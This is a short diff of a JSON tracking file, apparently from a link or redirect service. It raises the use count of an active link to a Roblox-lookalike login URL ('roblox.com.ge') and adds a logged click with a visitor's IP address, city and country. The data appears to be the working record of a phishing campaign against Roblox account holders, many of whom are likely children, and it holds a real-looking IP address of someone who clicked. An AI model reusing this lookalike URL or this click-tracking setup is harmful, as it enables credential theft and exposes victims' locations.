@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1601,
+    "useCount": 1602,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12976,6 +12976,14 @@
         "city": "Carbajales",
         "flag": "🇭🇳",
         "countryCode": "HN"
+      },
+      {
+        "timestamp": 1777504864509,
+        "ip": "177.238.194.112",
+        "country": "Mexico",
+        "city": "San Luis Río Colorado",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
